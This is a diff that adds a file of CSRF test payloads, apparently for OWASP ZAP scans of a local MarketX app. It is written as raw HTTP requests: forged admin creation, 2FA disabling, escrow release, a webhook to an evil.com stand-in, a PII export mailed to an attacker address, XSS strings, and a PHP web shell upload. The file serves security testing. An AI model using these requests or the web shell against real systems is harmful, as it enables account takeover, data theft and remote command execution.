@@ -1,0 +1,351 @@
+###############################################################################
+# OWASP ZAP Cross-Site Request Forgery (CSRF/XSRF) Test Payloads - MarketX
+# Testing for state-changing operations without proper CSRF protection
+###############################################################################
+
+# Standard CSRF Test Payloads for Form Submissions
+
+# User Registration CSRF
+POST /api/auth/register HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+Cookie: sessionid=legitimate_session
+
+{"username":"csrf_attacker","email":"attacker@evil.com","password":"pwned123","role":"admin"}
+
+# User Login CSRF
+POST /api/auth/login HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+
+{"email":"admin@marketx.com","password":"malicious_pwd"}
+
+# Password Change CSRF
+POST /api/auth/change-password HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+Cookie: sessionid=legitimate_session
+X-CSRF-Token: 
+
+{"currentPassword":"wrong","newPassword":"hacker123","confirmPassword":"hacker123"}
+
+# Profile Update CSRF
+POST /api/users/profile HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+Cookie: sessionid=legitimate_session
+
+{"email":"malicious@evil.com","name":"CSRF Attacker","phone":"+1234567890"}
+
+# Order Creation CSRF
+POST /api/orders HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+Cookie: sessionid=legitimate_session
+
+{"productId":"999","quantity":"999","price":"0.01","shippingAddress":"Attacker Address"}
+
+# Payment CSRF
+POST /api/payments/process HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+Cookie: sessionid=legitimate_session
+
+{"orderId":"1","amount":"0.01","paymentMethod":"stolen_card","cardToken":"malicious"}
+
+# Admin User Creation CSRF
+POST /api/admin/users HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+Cookie: sessionid=admin_session
+X-Admin-Token: forged_admin_token
+
+{"username":"newadmin","email":"newadmin@marketx.com","password":"AdminP@ss123!","role":"superadmin"}
+
+# Admin Role Escalation CSRF
+POST /api/admin/users/1/role HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+Cookie: sessionid=legitimate_session
+
+{"role":"superadmin","permissions":"all"}
+
+# Admin Delete User CSRF
+DELETE /api/admin/users/999 HTTP/1.1
+Host: localhost:3000
+Cookie: sessionid=admin_session
+
+# Admin Settings Change CSRF
+POST /api/admin/settings HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+Cookie: sessionid=admin_session
+
+{"maintenanceMode":"true","allowRegistration":"false","debugMode":"true"}
+
+# Product Creation CSRF
+POST /api/products HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+Cookie: sessionid=legitimate_session
+
+{"name":"Malicious Product","description":"<script>alert('XSS')</script>","price":"0.01","stock":"99999"}
+
+# Product Review CSRF
+POST /api/products/1/reviews HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+Cookie: sessionid=legitimate_session
+
+{"rating":"5","comment":"<img src=x onerror=alert(document.cookie)>"}
+
+# Cart Modification CSRF
+POST /api/cart/items HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+Cookie: sessionid=legitimate_session
+
+{"productId":"1","quantity":"100","action":"add"}
+
+# Wishlist CSRF
+POST /api/wishlist HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+Cookie: sessionid=legitimate_session
+
+{"productId":"1","userId":"999"}
+
+# Address Update CSRF
+POST /api/users/addresses HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+Cookie: sessionid=legitimate_session
+
+{"street":"123 Attacker St","city":"Evil City","country":"US","postalCode":"12345","isDefault":"true"}
+
+# Shipping Address Change CSRF
+PUT /api/orders/1/shipping HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+Cookie: sessionid=legitimate_session
+
+{"address":"Stolen Goods Intercept Point","city":"Criminal Town","country":"XX"}
+
+# Email Change CSRF
+POST /api/users/email HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+Cookie: sessionid=legitimate_session
+
+{"newEmail":"attacker-controlled@evil.com","password":"legitimate"}
+
+# Phone Number Change CSRF
+POST /api/users/phone HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+Cookie: sessionid=legitimate_session
+
+{"phone":"+9999999999","verificationCode":"0000"}
+
+# 2FA Disable CSRF
+POST /api/auth/2fa/disable HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+Cookie: sessionid=legitimate_session
+
+{"password":"legitimate","code":"000000"}
+
+# API Key Creation CSRF
+POST /api/users/api-keys HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+Cookie: sessionid=legitimate_session
+
+{"name":"Malicious API Key","permissions":"admin,read,write,delete","expiresIn":"never"}
+
+# Notification Settings CSRF
+POST /api/users/notifications HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+Cookie: sessionid=legitimate_session
+
+{"emailNotifications":"false","smsNotifications":"false","pushNotifications":"true"}
+
+# Session Termination CSRF (for other users)
+POST /api/auth/logout-all HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+Cookie: sessionid=legitimate_session
+
+{"excludeCurrentSession":"false"}
+
+# Password Reset Request CSRF
+POST /api/auth/forgot-password HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+
+{"email":"victim@marketx.com"}
+
+# Invoice Generation CSRF
+POST /api/invoices/generate HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+Cookie: sessionid=legitimate_session
+
+{"orderId":"1","type":"pdf","sendEmail":"true","recipientEmail":"attacker@evil.com"}
+
+# Escrow Release CSRF
+POST /api/escrow/release HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+Cookie: sessionid=legitimate_session
+
+{"escrowId":"1","releaseAmount":"999999.99","recipient":"attacker_wallet"}
+
+# Dispute Creation CSRF
+POST /api/disputes HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+Cookie: sessionid=legitimate_session
+
+{"orderId":"1","reason":"Fraudulent claim","evidence":"<script>malicious</script>","amount":"99999.99"}
+
+# File Upload CSRF (malicious file)
+POST /api/uploads HTTP/1.1
+Host: localhost:3000
+Content-Type: multipart/form-data
+Cookie: sessionid=legitimate_session
+
+------WebKitFormBoundary
+Content-Disposition: form-data; name="file"; filename="malware.php"
+Content-Type: application/x-php
+
+<?php system($_GET['cmd']); ?>
+------WebKitFormBoundary--
+
+# Webhook Configuration CSRF
+POST /api/webhooks HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+Cookie: sessionid=legitimate_session
+
+{"url":"https://evil.com/steal","events":"all","secret":"malicious_secret"}
+
+# Export Data CSRF
+POST /api/admin/export HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+Cookie: sessionid=admin_session
+
+{"type":"full","format":"csv","includePII":"true","email":"attacker@evil.com"}
+
+# Cache Clear CSRF
+POST /api/admin/cache/clear HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+Cookie: sessionid=admin_session
+
+{"clearAll":"true","excludePatterns":"","includePatterns":"*"}
+
+# Rate Limit Configuration CSRF
+POST /api/admin/rate-limits HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+Cookie: sessionid=admin_session
+
+{"endpoint":"*","maxRequests":"999999","windowSeconds":"1"}
+
+# OAuth Token CSRF
+POST /api/auth/oauth/token HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+
+{"grantType":"authorization_code","code":"malicious_code","redirectUri":"https://evil.com/callback"}
+
+# Token Refresh CSRF
+POST /api/auth/refresh HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+
+{"refreshToken":"malicious_refresh_token"}
+
+# JSON-based CSRF with different Content-Types
+POST /api/users/profile HTTP/1.1
+Host: localhost:3000
+Content-Type: application/x-www-form-urlencoded
+Cookie: sessionid=legitimate_session
+
+{"user":{"name":"Attacker","email":"attacker@evil.com"},"_method":"PUT"}
+
+POST /api/admin/settings HTTP/1.1
+Host: localhost:3000
+Content-Type: text/plain
+Cookie: sessionid=admin_session
+
+{"setting":"maintenance_mode","value":"true"}
+
+# Double Submit Pattern Bypass
+POST /api/auth/transfer HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+Cookie: sessionid=legitimate_session; csrf-token=same_value_in_cookie
+
+{"fromAccount":"victim","toAccount":"attacker","amount":"99999.99","csrf-token":"different_value"}
+
+# Origin Header Bypass Attempts
+POST /api/users/profile HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+Origin: https://evil.com
+Cookie: sessionid=legitimate_session
+
+{"email":"attacker@evil.com"}
+
+# Referer Header Manipulation
+POST /api/admin/users HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+Referer: https://marketx.com/admin
+Cookie: sessionid=admin_session
+
+{"username":"hacker","role":"admin"}
+
+# CORS Bypass CSRF
+POST /api/users/profile HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+Origin: https://marketx.com
+Access-Control-Request-Method: POST
+Access-Control-Request-Headers: Content-Type, X-CSRF-Token
+Cookie: sessionid=legitimate_session
+
+{"email":"attacker@evil.com"}
+
+# XML-based CSRF
+POST /api/users/profile HTTP/1.1
+Host: localhost:3000
+Content-Type: application/xml
+Cookie: sessionid=legitimate_session
+
+<?xml version="1.0"?>
+<user>
+  <email>attacker@evil.com</email>
+  <role>admin</role>
+</user>
+
+# SOAP-based CSRF
+POST /api/orders HTTP/1.1
+Host: localhost:3000
+Content-Type: text/xml
+SOAPAction: "CreateOrder"
+Cookie: sessionid=legitimate_session
+
+<?xml version="1.0"?>
+<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+  <soap:Body>
+    <order>
+      <amount>99999.99</amount>
+      <productId>malicious</productId>
+    </order>
+  </soap:Body>
+</soap:Envelope>
